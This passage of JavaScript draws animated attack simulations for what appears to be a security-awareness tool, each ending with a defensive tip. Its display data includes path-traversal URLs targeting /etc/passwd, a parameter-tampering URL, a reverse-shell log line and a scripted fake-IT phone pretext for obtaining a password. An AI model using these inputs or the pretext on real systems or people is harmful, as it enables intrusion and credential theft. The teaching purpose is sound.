        if(frame>=340){setProgress(100);termLog('> Simulation done. Use DAI on managed switches!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateSocialEngineering = function() {
    termLog('> Profiling target via OSINT intelligence...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame=0, contacted=0, trusted=0, extracted=0;
    const conversations=[
        {speaker:'ATTACKER',msg:'Hi, this is Mike from IT security. We detected suspicious activity on your account.',delay:40},
        {speaker:'VICTIM',msg:'Oh no, really? What kind of activity?',delay:100},
        {speaker:'ATTACKER',msg:'Someone tried to access your account from Russia. We need to verify your identity.',delay:160},
        {speaker:'VICTIM',msg:'Sure, how can I help?',delay:220},
        {speaker:'ATTACKER',msg:'Could you please confirm your username and current password for verification?',delay:280},
        {speaker:'VICTIM',msg:'It is jsmith / Summer@2024. Should I reset it?',delay:350},
        {speaker:'ATTACKER',msg:'No no, we will handle it from our end. Thank you!',delay:410},
        {speaker:'SYSTEM',msg:'CREDENTIALS EXFILTRATED: jsmith / Summer@2024',delay:440},
    ];
    const osintData=['john.smith@acmecorp.com (LinkedIn)','IT Manager @ ACME Corp (5 years)','(555) 867-5309 (company directory)','@jsmith_acme (Twitter)','Uses Summer passwords (OSINT)'];

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Pretext crafted: Fake IT security call.','warning');},700);

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);

        const osintW=Math.min(200,w*0.3);
        ctx.fillStyle='rgba(255,170,0,0.05)'; ctx.strokeStyle='rgba(255,170,0,0.15)'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.roundRect(8,8,osintW,120,6); ctx.fill(); ctx.stroke();
        ctx.fillStyle='#ffaa00'; ctx.font='bold 9px monospace'; ctx.textAlign='left';
        ctx.fillText('OSINT INTELLIGENCE',16,23);
        osintData.slice(0,Math.min(5,Math.floor(frame/15)+1)).forEach((d,i)=>{
            ctx.fillStyle='#8892a8'; ctx.font='8px monospace'; ctx.fillText(d,16,38+i*17);
        });

        const chatX=osintW+16, chatW=w-chatX-8;
        ctx.fillStyle='rgba(255,255,255,0.02)'; ctx.strokeStyle='rgba(255,255,255,0.05)'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.roundRect(chatX,8,chatW,h-16,6); ctx.fill(); ctx.stroke();
        ctx.fillStyle='#8892a8'; ctx.font='bold 9px monospace'; ctx.textAlign='center';
        ctx.fillText('PHONE CALL TRANSCRIPT',chatX+chatW/2,23);

        const visible=conversations.filter(c=>c.delay<=frame);
        visible.forEach((conv,i)=>{
            const cy=35+i*42; if(cy>h-20)return;
            const isAtt=conv.speaker==='ATTACKER', isSys=conv.speaker==='SYSTEM';
            const bx=isAtt?chatX+8:chatX+chatW*0.3, bw=chatW*0.65;
            const nameColor=isSys?'#ff3b3b':isAtt?'#ffaa00':'#3b82f6';
            ctx.fillStyle=isSys?'rgba(255,59,59,0.12)':isAtt?'rgba(255,170,0,0.08)':'rgba(59,130,246,0.08)';
            ctx.strokeStyle=`${nameColor}50`; ctx.lineWidth=1;
            ctx.beginPath(); ctx.roundRect(bx,cy,bw,34,5); ctx.fill(); ctx.stroke();
            ctx.fillStyle=nameColor; ctx.font='bold 8px monospace'; ctx.textAlign='left';
            ctx.fillText(conv.speaker,bx+7,cy+11);
            ctx.fillStyle=isSys?'#ff3b3b':'#e8ecf4'; ctx.font='8px Arial';
            ctx.fillText(conv.msg.length>65?conv.msg.slice(0,65)+'...':conv.msg,bx+7,cy+25);
        });

        if(frame===200){activateStep(2);contacted=5;termLog('> Target answering phone — guard lowering...','warning');}
        if(frame===280){activateStep(3);trusted=4;termLog('> Victim TRUSTS the attacker — guard down.','warning');}
        if(frame===360){activateStep(4);extracted=3;termLog('> CREDENTIALS EXTRACTED: jsmith / Summer@2024','error');}

        if(frame%20===0){
            const e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e1)e1.textContent=contacted;
            if(e2)e2.textContent=trusted;
            if(e3)e3.textContent=extracted;
            setProgress(Math.min(100,(frame/470)*100));
        }
        if(frame>=470){setProgress(100);termLog('> Done. Train users — never share passwords!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateInsiderThreat = function() {
    termLog('> Monitoring privileged user activity...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame=0, filesEx=0, systemsAcc=0;
    const fileList=['HR/employee_salaries.xlsx','LEGAL/acquisition_plans_CONFIDENTIAL.pdf','R&D/product_roadmap_2025.pptx','FINANCE/Q4_earnings_unreleased.xlsx','IT/admin_passwords.kdbx','CUSTOMER/pii_database.csv','IP/patent_applications.docx','SECURITY/network_topology.pdf'];
    const exfilFiles=[];

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Insider escalating privileges via role access.','warning');},700);
    simTimeout(()=>{if(!state.simRunning)return;systemsAcc=8;activateStep(2);termLog('> Accessing restricted repositories...','error');},1400);

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);

        const nodes=[
            {x:w*0.18,y:h*0.22,label:'HR Server',color:'#3b82f6',accessed:frame>60},
            {x:w*0.38,y:h*0.12,label:'Finance DB',color:'#8b5cf6',accessed:frame>100},
            {x:w*0.58,y:h*0.22,label:'R&D Repo',color:'#39ff14',accessed:frame>140},
            {x:w*0.78,y:h*0.12,label:'Legal Docs',color:'#ffaa00',accessed:frame>180},
            {x:w*0.5,y:h*0.44,label:'INSIDER',color:'#ff3b3b',evil:true},
        ];

        nodes.slice(0,4).forEach(node=>{
            const c=node.accessed?'#ff3b3b':node.color;
            ctx.beginPath(); ctx.moveTo(node.x,node.y); ctx.lineTo(nodes[4].x,nodes[4].y);
            ctx.strokeStyle=node.accessed?'rgba(255,59,59,0.35)':'rgba(255,255,255,0.04)';
            ctx.setLineDash(node.accessed?[4,4]:[]); ctx.lineWidth=1; ctx.stroke(); ctx.setLineDash([]);
            ctx.shadowBlur=node.accessed?14:0; ctx.shadowColor='#ff3b3b';
            ctx.beginPath(); ctx.arc(node.x,node.y,18,0,Math.PI*2);
            ctx.fillStyle=`${c}18`; ctx.fill(); ctx.strokeStyle=c; ctx.lineWidth=2; ctx.stroke(); ctx.shadowBlur=0;
            ctx.fillStyle=c; ctx.font='bold 8px monospace'; ctx.textAlign='center'; ctx.textBaseline='top';
            ctx.fillText(node.label,node.x,node.y+20);
            if(node.accessed)ctx.fillText('ACCESSED',node.x,node.y+31);
        });

        ctx.beginPath(); ctx.arc(nodes[4].x,nodes[4].y,20,0,Math.PI*2);
        ctx.fillStyle='rgba(255,59,59,0.2)'; ctx.fill(); ctx.strokeStyle='#ff3b3b'; ctx.lineWidth=2; ctx.stroke();
        ctx.fillStyle='#ff3b3b'; ctx.font='bold 8px monospace'; ctx.textAlign='center'; ctx.textBaseline='top';
        ctx.fillText('INSIDER',nodes[4].x,nodes[4].y+22);

        const exY=h*0.58;
        ctx.fillStyle='rgba(255,59,59,0.04)'; ctx.strokeStyle='rgba(255,59,59,0.14)'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.roundRect(8,exY,w-16,h-exY-8,6); ctx.fill(); ctx.stroke();
        ctx.fillStyle='#ff3b3b'; ctx.font='bold 9px monospace'; ctx.textAlign='left';
        ctx.fillText('EXFILTRATION LOG — Files copied to USB drive:',16,exY+14);

        if(frame%50===0&&exfilFiles.length<fileList.length&&frame>80){
            exfilFiles.push(fileList[exfilFiles.length]);
            filesEx=exfilFiles.length;
            termLog(`> Exfiltrating: ${fileList[exfilFiles.length-1]}`,'error');
            if(exfilFiles.length===4)activateStep(3);
        }

        exfilFiles.slice(-5).forEach((f,i)=>{
            ctx.fillStyle='#8892a8'; ctx.font='8px monospace';
            ctx.fillText(`${new Date().toLocaleTimeString()} | ${f} → USB_Drive_32GB`,16,exY+28+i*16);
        });

        if(frame===350){activateStep(4);termLog('> Audit logs DELETED. Cover tracks complete.','error');}

        if(frame%20===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=Math.min(30,systemsAcc+Math.floor(frame/40));
            if(e1)e1.textContent=filesEx;
            if(e2)e2.textContent=`${(filesEx*8.2).toFixed(1)} MB`;
            if(e3)e3.textContent=frame > 300 ? 'Escalated' : '77 days';
            setProgress(Math.min(100,(frame/420)*100));
        }
        if(frame>=420){setProgress(100);termLog('> Simulation done. Implement UEBA & DLP!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulatePasswordAttack = function() {
    termLog('> Loading leaked credential database from dark web...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame=0, hashesAnalyzed=0, cracked=0, sitesTested=0, accountsTaken=0;
    const hashTypes=['MD5','SHA-1','SHA-256','bcrypt','NTLM','LM'];
    const passwords=['123456','password','qwerty','letmein','admin123','Summer2024!','Welcome1','Pass@123'];
    const hashes=passwords.map(p=>({pwd:p,hash:btoa(p).substring(0,22)+'==',type:hashTypes[Math.floor(Math.random()*hashTypes.length)],cracked:false,progress:0}));
    const sites=['Gmail','LinkedIn','Twitter','GitHub','Banking','Slack','AWS Console','VPN Portal'];

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> 4.7 million hashes loaded. Analyzing hash types...','warning');},600);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Rainbow table lookup initiated...','error');},1400);

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);

        const bW=Math.min(580,w-20), bX=(w-bW)/2;
        ctx.fillStyle='#ffaa00'; ctx.font='bold 12px monospace'; ctx.textAlign='center';
        ctx.fillText('PASSWORD HASH CRACKING — RAINBOW TABLE',w/2,22);
        hashes.forEach((entry,i)=>{
            const hy=40+i*42;
            if(hy>h-60)return;
            if(frame>40+i*25&&!entry.cracked){
                entry.progress=Math.min(1,entry.progress+0.025);
                if(entry.progress>=1){entry.cracked=true;cracked++;activateStep(3);}
            }
            hashesAnalyzed=Math.min(hashes.length,Math.floor(frame/30));

            const isWeak=['MD5','SHA-1','NTLM','LM'].includes(entry.type);
            ctx.fillStyle=entry.cracked?'rgba(255,59,59,0.12)':entry.progress>0?'rgba(255,170,0,0.08)':'rgba(255,255,255,0.02)';
            ctx.strokeStyle=entry.cracked?'rgba(255,59,59,0.35)':isWeak?'rgba(255,170,0,0.25)':'rgba(57,255,20,0.2)';
            ctx.lineWidth=1; ctx.beginPath(); ctx.roundRect(bX,hy,bW,34,4); ctx.fill(); ctx.stroke();
            if(entry.progress>0&&!entry.cracked){
                ctx.fillStyle='rgba(255,170,0,0.25)';
                ctx.beginPath(); ctx.roundRect(bX,hy,bW*entry.progress,34,4); ctx.fill();
            }

            ctx.fillStyle=entry.cracked?'#ff3b3b':isWeak?'#ffaa00':'#39ff14';
            ctx.font='bold 9px monospace'; ctx.textAlign='left';
            ctx.fillText(`${entry.type} ${isWeak?'(WEAK)':'(STRONG)'}`,bX+8,hy+13);
            ctx.fillStyle='#525c70'; ctx.font='9px monospace';
            ctx.fillText(entry.hash,bX+95,hy+13);
            if(entry.cracked){
                ctx.fillStyle='#ff3b3b'; ctx.font='bold 9px monospace'; ctx.textAlign='right';
                ctx.fillText(`CRACKED: ${entry.pwd}`,bX+bW-8,hy+13);
            }
            ctx.fillStyle='rgba(255,255,255,0.05)'; ctx.fillRect(bX+8,hy+20,bW-16,6);
            const barGrad=ctx.createLinearGradient(bX+8,0,bX+bW-8,0);
            barGrad.addColorStop(0,'#ffaa00'); barGrad.addColorStop(1,entry.cracked?'#ff3b3b':'#39ff14');
            ctx.fillStyle=barGrad;
            ctx.fillRect(bX+8,hy+20,(bW-16)*entry.progress,6);
            ctx.textAlign='left';
        });
        if(cracked>3&&frame%40===0&&sitesTested<sites.length){
            sitesTested++;
            if(Math.random()>0.5){accountsTaken++;activateStep(4);termLog(`> Account takeover: ${sites[sitesTested-1]} — credentials matched!`,'error');}
            else termLog(`> Testing ${sites[sitesTested-1]}... FAILED`,'warning');
        }

        if(frame%15===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=(hashesAnalyzed*580000).toLocaleString();
            if(e1)e1.textContent=cracked;
            if(e2)e2.textContent=sitesTested;
            if(e3)e3.textContent=accountsTaken;
            setProgress(Math.min(100,(frame/380)*100));
        }
        if(frame>=380){setProgress(100);termLog('> Simulation done. Use bcrypt + MFA!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateURLInterpretation = function() {
    termLog('> Probing web application URL structure...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame=0, urlsProbed=0, pathsTraversed=0, filesAccessed=0, authBypasses=0;
    const urlTests=[
        {url:'https://shop.example.com/../../etc/passwd',type:'PATH TRAVERSAL',result:'root:x:0:0:root:/root:/bin/bash',severity:'critical',delay:30},
        {url:'https://app.example.com/user?id=1&role=admin',type:'PARAM TAMPERING',result:'Admin panel unlocked',severity:'high',delay:80},
        {url:'https://site.com/admin/../admin/config.php',type:'FORCED BROWSE',result:'DB_PASS=s3cr3t exposed',severity:'critical',delay:130},
        {url:'https://api.example.com/../../../windows/system32/drivers/etc/hosts',type:'WIN TRAVERSAL',result:'127.0.0.1 localhost',severity:'high',delay:180},
        {url:'https://corp.com/backup.zip',type:'FORCED BROWSE',result:'Full source code archive',severity:'critical',delay:230},
        {url:'https://login.com/reset?user=admin&token=',type:'PARAM INJECTION',result:'Password reset bypassed',severity:'critical',delay:280},
    ];

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> ../../../etc/passwd — traversal payload injected!','error');},600);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Parameter manipulation: ?user_id=1 → ADMIN','error');},1200);

    let revealed=[];
    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);

        ctx.fillStyle='#3b82f6'; ctx.font='bold 11px monospace'; ctx.textAlign='center';
        ctx.fillText('URL MANIPULATION ATTACKS — PROBE RESULTS',w/2,22);
        urlTests.forEach(test=>{
            if(frame>=test.delay&&!revealed.includes(test.url)){
                revealed.push(test.url);
                urlsProbed++;
                if(test.type.includes('TRAVERSAL'))pathsTraversed++;
                if(test.severity==='critical'){filesAccessed++;authBypasses++;}
                termLog(`> ${test.type}: ${test.result}`,'error');
                if(revealed.length===2)activateStep(2);
                if(revealed.length===4)activateStep(3);
                if(revealed.length===6)activateStep(4);
            }
        });

        const bW=Math.min(580,w-20), bX=(w-bW)/2;
        revealed.forEach((url,i)=>{
            const test=urlTests.find(t=>t.url===url);
            if(!test)return;
            const ry=40+i*52; if(ry>h-20)return;
            const isCrit=test.severity==='critical';
            ctx.fillStyle=isCrit?'rgba(255,59,59,0.1)':'rgba(255,170,0,0.08)';
            ctx.strokeStyle=isCrit?'rgba(255,59,59,0.35)':'rgba(255,170,0,0.3)';
            ctx.lineWidth=1; ctx.beginPath(); ctx.roundRect(bX,ry,bW,44,5); ctx.fill(); ctx.stroke();

            ctx.fillStyle=isCrit?'#ff3b3b':'#ffaa00'; ctx.font='bold 8px monospace'; ctx.textAlign='left';
            ctx.fillText(`[${test.type}]`,bX+8,ry+13);
            ctx.fillStyle='#3b82f6'; ctx.font='8px monospace';
            const shortUrl=test.url.length>65?test.url.slice(0,62)+'...':test.url;
            ctx.fillText(shortUrl,bX+8,ry+25);
            ctx.fillStyle=isCrit?'#ff3b3b':'#ffaa00'; ctx.font='bold 8px monospace';
            ctx.fillText(`RESULT: ${test.result}`,bX+8,ry+38);
        });

        if(frame%20===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=urlsProbed*25;
            if(e1)e1.textContent=pathsTraversed;
            if(e2)e2.textContent=filesAccessed;
            if(e3)e3.textContent=authBypasses;
            setProgress(Math.min(100,(frame/360)*100));
        }
        if(frame>=360){setProgress(100);termLog('> Simulation done. Validate all URL inputs!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateSessionHijack = function() {
    termLog('> Scanning network for active session tokens...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame=0, sessionsMonitored=0, tokensCaptured=0, replaysAttempted=0, hijacksSuccessful=0;
    const sessions=[
        {id:'sess_eyJhbGci...Xk9mT2w',user:'alice@corp.com',site:'CRM System',x:0,y:0,captured:false,progress:0},
        {id:'PHPSESSID=a3f7c9b2...e4d1',user:'bob@corp.com',site:'Admin Panel',x:0,y:0,captured:false,progress:0},
        {id:'auth=Bearer eyJzdWIi...7f2',user:'carol@corp.com',site:'Bank Portal',x:0,y:0,captured:false,progress:0},
        {id:'token=d8f3a1b7...9e5c',user:'dave@corp.com',site:'Email (IMAP)',x:0,y:0,captured:false,progress:0},
    ];

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Session token captured from HTTP traffic.','error');},700);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Replaying stolen token in attacker browser...','error');},1500);

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);

        ctx.fillStyle='#8b5cf6'; ctx.font='bold 12px monospace'; ctx.textAlign='center';
        ctx.fillText('SESSION HIJACKING — TOKEN THEFT & REPLAY',w/2,22);

        const bW=Math.min(580,w-20), bX=(w-bW)/2;
        sessionsMonitored=Math.min(sessions.length,Math.ceil(frame/30));

        sessions.slice(0,sessionsMonitored).forEach((sess,i)=>{
            const sy=40+i*72;
            if(frame>60+i*45&&!sess.captured){
                sess.progress=Math.min(1,sess.progress+0.02);
                if(sess.progress>=1){sess.captured=true;tokensCaptured++;replaysAttempted++;hijacksSuccessful++;activateStep(3);termLog(`> Hijacked: ${sess.user} on ${sess.site}!`,'error');}
            }
            ctx.fillStyle=sess.captured?'rgba(139,92,246,0.15)':'rgba(255,255,255,0.02)';
            ctx.strokeStyle=sess.captured?'rgba(139,92,246,0.5)':'rgba(255,255,255,0.06)';
            ctx.lineWidth=1; ctx.beginPath(); ctx.roundRect(bX,sy,bW,60,6); ctx.fill(); ctx.stroke();
            if(sess.progress>0&&!sess.captured){
                ctx.fillStyle='rgba(139,92,246,0.2)'; ctx.beginPath(); ctx.roundRect(bX,sy,bW*sess.progress,60,6); ctx.fill();
            }

            ctx.fillStyle='#8892a8'; ctx.font='bold 9px monospace'; ctx.textAlign='left';
            ctx.fillText(`USER: ${sess.user}  |  TARGET: ${sess.site}`,bX+10,sy+14);
            ctx.fillStyle='#525c70'; ctx.font='8px monospace';
            ctx.fillText(sess.id,bX+10,sy+27);

            if(sess.captured){
                ctx.fillStyle='rgba(139,92,246,0.3)'; ctx.beginPath(); ctx.roundRect(bX+10,sy+36,bW-20,18,4); ctx.fill();
                ctx.fillStyle='#8b5cf6'; ctx.font='bold 9px monospace'; ctx.textAlign='center';
                ctx.fillText('SESSION HIJACKED — Attacker logged in as '+sess.user.split('@')[0],bX+bW/2,sy+48);
                if(i===0&&frame>sess.progress*50+100)activateStep(4);
            } else {
                const dots='.'+'..'.repeat(Math.floor(frame/10)%3+1);
                ctx.fillStyle='#ffaa00'; ctx.font='9px monospace'; ctx.textAlign='left';
                ctx.fillText(`Intercepting${dots}`,bX+10,sy+48);
            }
        });

        if(frame%15===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=sessionsMonitored*1200;
            if(e1)e1.textContent=tokensCaptured;
            if(e2)e2.textContent=replaysAttempted;
            if(e3)e3.textContent=hijacksSuccessful;
            setProgress(Math.min(100,(frame/350)*100));
        }
        if(frame>=350){setProgress(100);termLog('> Simulation done. Regenerate tokens on login!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateTrojan = function() {
    termLog('> Trojan packaged as fake game installer...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame=0, c2Connections=0, filesStolen=0, keystrokesLogged=0, payloadDownloads=0;
    const c2Packets=[];
    const stealItems=['Documents/passwords.txt','Desktop/bank_login.docx','Pictures/id_scan.jpg','AppData/Chrome/Cookies','Saved Passwords (Chrome)','SSH Keys (~/.ssh/id_rsa)'];
    let stolenItems=[];

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> User executed: Game_Crack_v2.3.exe','error');},600);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Backdoor opened: reverse shell to 45.33.xx.xx:4444','error');},1400);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(3);termLog('> Keylogger hook installed (SetWindowsHookEx)','error');},2200);

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
        const midX=w/2-10;
        ctx.fillStyle='rgba(255,255,255,0.02)'; ctx.strokeStyle='rgba(255,255,255,0.05)'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.roundRect(8,10,midX-8,h-20,6); ctx.fill(); ctx.stroke();
        ctx.fillStyle='#3b82f6'; ctx.font='bold 10px monospace'; ctx.textAlign='center';
        ctx.fillText('VICTIM MACHINE',midX/2,26);
        if(frame<40){
            ctx.fillStyle='rgba(30,40,60,0.9)'; ctx.beginPath(); ctx.roundRect(20,40,midX-28,100,6); ctx.fill();
            ctx.fillStyle='#e8ecf4'; ctx.font='bold 12px monospace'; ctx.textAlign='center';
            ctx.fillText('Game_Crack_v2.3.exe',midX/2,65);
            ctx.fillStyle='#8892a8'; ctx.font='9px monospace';
            ctx.fillText('Installing... Please wait',midX/2,90);
            ctx.fillStyle='rgba(57,255,20,0.8)'; ctx.fillRect(30,105,Math.min((midX-48)*(frame/40),midX-48),10);
        } else {
            ctx.fillStyle='rgba(255,59,59,0.08)'; ctx.beginPath(); ctx.roundRect(20,40,midX-28,100,6); ctx.fill();
            ctx.fillStyle='#ff3b3b'; ctx.font='bold 10px monospace'; ctx.textAlign='center';
            ctx.fillText('TROJAN ACTIVE IN BACKGROUND',midX/2,65);
            ctx.fillStyle='#8892a8'; ctx.font='8px monospace';
            ctx.fillText(`Processes: svhost32.exe (hidden)`,midX/2,82);
            ctx.fillText(`Port: 4444 OPEN (reverse shell)`,midX/2,96);
            ctx.fillText(`Hook: WH_KEYBOARD_LL (active)`,midX/2,110);
        }
        if(stolenItems.length>0){
            ctx.fillStyle='#8892a8'; ctx.font='bold 8px monospace'; ctx.textAlign='left';
            ctx.fillText('EXFILTRATING:',20,165);
            stolenItems.slice(-5).forEach((item,i)=>{
                ctx.fillStyle=`rgba(255,59,59,${0.9-i*0.1})`; ctx.font='8px monospace';
                ctx.fillText(`📤 ${item}`,20,180+i*16);
            });
        }
        if(frame>100){
            const kY=h-80;
            ctx.fillStyle='rgba(255,0,170,0.05)'; ctx.strokeStyle='rgba(255,0,170,0.2)'; ctx.lineWidth=1;
            ctx.beginPath(); ctx.roundRect(8,kY,midX-8,65,4); ctx.fill(); ctx.stroke();
            ctx.fillStyle='#ff00aa'; ctx.font='bold 8px monospace'; ctx.textAlign='left';
            ctx.fillText('KEYLOG:',16,kY+14);
            const sample='password123 [ENTER] admin [TAB] MyBank2024! [ENTER]';
            ctx.fillStyle='#8892a8'; ctx.font='8px monospace';
            ctx.fillText(sample.slice(0,Math.min(sample.length,Math.floor((frame-100)/2))),16,kY+30);
            keystrokesLogged=Math.min(480,frame*2);
        }
        ctx.fillStyle='rgba(255,59,59,0.03)'; ctx.strokeStyle='rgba(255,59,59,0.12)'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.roundRect(midX+8,10,w-midX-18,h-20,6); ctx.fill(); ctx.stroke();
        ctx.fillStyle='#ff3b3b'; ctx.font='bold 10px monospace'; ctx.textAlign='center';
        ctx.fillText('ATTACKER C2',midX+8+(w-midX-18)/2,26);

        c2Connections=Math.min(50,Math.floor(frame/8));
        ctx.fillStyle='#ff3b3b'; ctx.font='bold 22px monospace'; ctx.textAlign='center';
        ctx.fillText(c2Connections,midX+8+(w-midX-18)/2,h/2-20);
        ctx.fillStyle='#8892a8'; ctx.font='9px monospace';
        ctx.fillText('Active C2 Connections',midX+8+(w-midX-18)/2,h/2+5);
        ctx.fillText(`${filesStolen} files stolen`,midX+8+(w-midX-18)/2,h/2+20);
        ctx.fillText(`${payloadDownloads} payloads delivered`,midX+8+(w-midX-18)/2,h/2+35);
        if(frame%20===0&&frame>40){
            c2Packets.push({x:midX-10,y:h/2,tx:midX+20,ty:h/2,p:0});
        }
        c2Packets.forEach(pkt=>{
            pkt.p+=0.05;
            const px=pkt.x+(pkt.tx-pkt.x)*pkt.p, py=pkt.y+(pkt.ty-pkt.y)*pkt.p;
            ctx.beginPath(); ctx.arc(px,py,4,0,Math.PI*2);
            ctx.fillStyle=`rgba(255,59,59,${1-pkt.p})`; ctx.fill();
        });
        c2Packets.splice(0,c2Packets.filter(p=>p.p>=1).length);
        if(frame%70===0&&stolenItems.length<stealItems.length&&frame>60){
            stolenItems.push(stealItems[stolenItems.length]);
            filesStolen++;
            if(stolenItems.length===3)activateStep(3);
        }
        if(frame===280){payloadDownloads++;activateStep(4);termLog('> Ransomware payload downloaded and executing!','error');}

        if(frame%15===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=c2Connections;
            if(e1)e1.textContent=filesStolen;
            if(e2)e2.textContent=keystrokesLogged.toLocaleString();
            if(e3)e3.textContent=payloadDownloads;
            setProgress(Math.min(100,(frame/360)*100));
        }
        if(frame>=360){setProgress(100);termLog('> Simulation done. Only install verified software!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateDriveBy = function() {
    termLog('> Victim navigating to compromised website...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame=0, pagesVisited=0, exploitsAttempted=0, payloadsDropped=0, systemsInfected=0;
    const exploits=[
        {name:'CVE-2024-1234 (Chrome V8)',status:'scanning',progress:0,result:'VULNERABLE'},
        {name:'CVE-2023-5678 (PDF Reader)',status:'scanning',progress:0,result:'PATCHED'},
        {name:'CVE-2024-9101 (JS Engine)',status:'scanning',progress:0,result:'VULNERABLE'},
        {name:'Adobe Flash (EOL)',status:'scanning',progress:0,result:'VULNERABLE'},
    ];

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Browser fingerprint: Chrome 118, unpatched!','warning');},700);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Exploit triggered: CVE-2024-1234 V8 bug!','error');},1500);

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
        const bW=Math.min(560,w-20), bX=(w-bW)/2;
        ctx.fillStyle='rgba(20,25,40,0.95)'; ctx.strokeStyle='rgba(255,0,170,0.2)'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.roundRect(bX,8,bW,h-16,8); ctx.fill(); ctx.stroke();
        ctx.fillStyle='rgba(255,0,170,0.08)'; ctx.fillRect(bX,8,bW,26);
        ctx.fillStyle='#ff00aa'; ctx.font='9px monospace'; ctx.textAlign='left';
        ctx.fillText(`http://news-today${frame>30?'-legit':''}.com/article`,bX+10,24);
        ctx.fillStyle='#ffaa00'; ctx.font='8px monospace';
        ctx.fillText('⚠ NOT SECURE',bX+bW-80,24);
        if(frame<40){
            ctx.fillStyle='#e8ecf4'; ctx.font='bold 14px Inter'; ctx.textAlign='center';
            ctx.fillText('Breaking News — Click to Read More',bX+bW/2,65);
            ctx.fillStyle='#8892a8'; ctx.font='10px monospace';
            ctx.fillText('Loading article...',bX+bW/2,90);
        } else {
            ctx.fillStyle='#ff00aa'; ctx.font='bold 10px monospace'; ctx.textAlign='center';
            ctx.fillText('EXPLOIT KIT ACTIVATED — SCANNING BROWSER',bX+bW/2,50);

            exploits.forEach((ex,i)=>{
                const ey=70+i*42;
                if(frame>40+i*35){
                    ex.progress=Math.min(1,ex.progress+0.03);
                    if(ex.progress>=1&&ex.status==='scanning'){
                        ex.status='done'; exploitsAttempted++;
                        if(ex.result==='VULNERABLE'){payloadsDropped++;systemsInfected++;termLog(`> Exploiting: ${ex.name}!`,'error');}
                    }
                }

                const isvuln=ex.result==='VULNERABLE'&&ex.status==='done';
                const ispatched=ex.result==='PATCHED'&&ex.status==='done';
                ctx.fillStyle=isvuln?'rgba(255,59,59,0.15)':ispatched?'rgba(57,255,20,0.05)':'rgba(255,255,255,0.02)';
